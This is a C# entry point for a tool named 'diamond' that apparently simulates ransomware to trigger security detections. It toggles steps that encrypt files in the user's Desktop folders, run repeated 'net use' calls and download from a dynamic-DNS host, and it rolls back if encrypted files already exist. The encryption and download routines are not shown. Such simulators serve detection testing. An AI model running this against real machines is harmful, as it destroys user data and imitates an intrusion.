using System;
using System.IO;

namespace diamond;

internal class Program
{
	private static Logger logger = new Logger();

	private static bool ransomware = true;

	private static bool dyndnsdownload = true;

	private static bool netuse = true;

	private static void Main(string[] args)
	{
		try
		{
			Arguments arguments = new Arguments(args);
			TriggerRules triggerRules = new TriggerRules();
			if (arguments["ransomware"] != null)
			{
				ransomware = Convert.ToBoolean(arguments["ransomware"]);
			}
			if (arguments["dyndnsdownload"] != null)
			{
				dyndnsdownload = Convert.ToBoolean(arguments["dyndnsdownload"]);
			}
			if (arguments["netuse"] != null)
			{
				netuse = Convert.ToBoolean(arguments["netuse"]);
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string[] files = Directory.GetFiles(folderPath + "\\Documents", "*.encrypt");
			string[] files2 = Directory.GetFiles(folderPath + "\\Music", "*.encrypt");
			string[] files3 = Directory.GetFiles(folderPath + "\\Pictures", "*.encrypt");
			string[] files4 = Directory.GetFiles(folderPath + "\\Videos", "*.encrypt");
			if (files.Length != 0 || files2.Length != 0 || files3.Length != 0 || files4.Length != 0)
			{
				logger.AddtoLogFile("Existing encrypted files found, rolling back...");
				triggerRules.ProcessRollback(folderPath);
				Environment.Exit(0);
			}
			if (ransomware)
			{
				triggerRules.ProcessDirectory(folderPath);
			}
			if (netuse)
			{
				triggerRules.NetUse();
				triggerRules.NetUse();
				triggerRules.NetUse();
				triggerRules.NetUse();
			}
			if (dyndnsdownload)
			{
				triggerRules.DynDnsDownload();
			}
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in main: " + ex.Message);
		}
	}
}
